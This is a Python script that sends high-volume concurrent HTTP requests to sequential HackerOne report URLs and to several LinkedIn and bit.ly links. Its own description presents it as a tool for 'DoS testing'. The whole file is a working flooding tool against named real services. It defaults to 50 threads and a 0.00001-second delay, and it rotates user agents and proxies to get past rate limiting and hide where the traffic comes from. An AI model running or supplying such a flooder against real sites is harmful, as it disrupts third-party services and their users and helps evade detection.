import requests
import time
import random
import concurrent.futures
import argparse

# Base URL for the HackerOne reports with sequential IDs
report_base_url = "https://hackerone.com/reports/"

# Additional URLs to target
additional_urls = [
    "https://www.linkedin.com/company/hackerone/",
    "https://bit.ly/3Kcfv4p",
    "https://bit.ly/4dEvyVf",
    "https://www.linkedin.com/posts/hackerone_leadershipdevelopment-hackeronelife-leaders-activity-7229171108879491073-W7b5?utm_source=share&utm_medium=member_android"
]

# User-Agent list for rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
]

# Function to make a single request with optional proxy
def make_request(url, user_agent, proxy=None):
    headers = {"User-Agent": user_agent}
    try:
        if proxy:
            response = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy})
        else:
            response = requests.get(url, headers=headers)
        print(f"Requested URL: {url}, Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed for URL: {url}, Error: {e}")

# Function to handle the report requests
def request_report(report_id, proxy=None):
    url = f"{report_base_url}{report_id:07d}"
    user_agent = random.choice(user_agents)
    make_request(url, user_agent, proxy)

# Function to handle the additional URL requests
def request_additional_url(proxy=None):
    url = random.choice(additional_urls)
    user_agent = random.choice(user_agents)
    make_request(url, user_agent, proxy)

# Main function to orchestrate the requests
def start_requests(start_report_id, end_report_id, delay, concurrency, proxies=None):
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
        for report_id in range(start_report_id, end_report_id + 1):
            proxy = random.choice(proxies) if proxies else None
            executor.submit(request_report, report_id, proxy)
            executor.submit(request_additional_url, proxy)
            time.sleep(delay)

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Script to perform requests for potential DoS testing.")
parser.add_argument("--start", type=int, default=1, help="Starting report ID (default is 0000001)")
parser.add_argument("--end", type=int, default=9999999, help="Ending report ID (default is 9999999)")
parser.add_argument("--delay", type=float, default=0.00001, help="Delay between requests (default is 0.00001 seconds)")
parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent requests (default is 50)")
parser.add_argument("--proxies", type=str, help="Path to a file with proxy list (optional)")

args = parser.parse_args()

# Load proxies if provided
proxy_list = []
if args.proxies:
    with open(args.proxies, 'r') as file:
        proxy_list = [line.strip() for line in file.readlines()]

# Start making requests
start_requests(args.start, args.end, args.delay, args.concurrency, proxies=proxy_list)
